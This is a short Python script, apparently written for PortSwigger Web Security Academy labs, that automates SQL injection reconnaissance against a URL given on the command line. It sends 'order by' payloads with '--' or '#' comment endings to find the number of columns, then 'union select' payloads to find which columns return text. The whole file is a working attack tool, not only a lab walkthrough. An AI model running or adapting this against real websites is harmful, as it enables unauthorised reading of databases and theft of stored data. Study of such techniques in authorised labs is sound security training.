#https://portswigger.net/web-security/all-labs

from sys import argv        # To pass argument into script 
import requests 





def FindColumsNumber(TargetUrl):
	# Check if -- comment method works or # method
	respond = requests.get(TargetUrl+"' order by 1--")
	if respond.status_code == 200 :
		print("using -- comment method ")
		for i in range(1,50):
			respond = requests.get(TargetUrl+"' order by %s --"%i)
			if respond.status_code != 200:
				return i - 1
		return False
	else:
		print("using # comment method ")
		for i in range(1,50):
			respond = requests.get(TargetUrl+"' order by {0} %23".format(i))
			if respond.status_code != 200:
				return i - 1
		return False

def FindTextCoulmn(TargetUrl, NumberOfColums):
	'''we need to send N of requsets if respond == 200  '''
	TextColums = [] # the index of the text
	for i in range(NumberOfColums):
		PayloadList = ['null'] * NumberOfColums
		PayloadList[i] = "'a'"
		payload = "' union select "+ ','.join(PayloadList) + " --" 
		respond = requests.get(TargetUrl+payload )
		if respond.status_code == 200:
			TextColums.append(i)
	else:
		for i in TextColums:
			print(str(i) + " is text # zero index based")


if __name__ == "__main__" :
	TargetUrl = argv[1]
	NumOfColums = FindColumsNumber(TargetUrl)
	FindTextCoulmn(TargetUrl,NumOfColums)
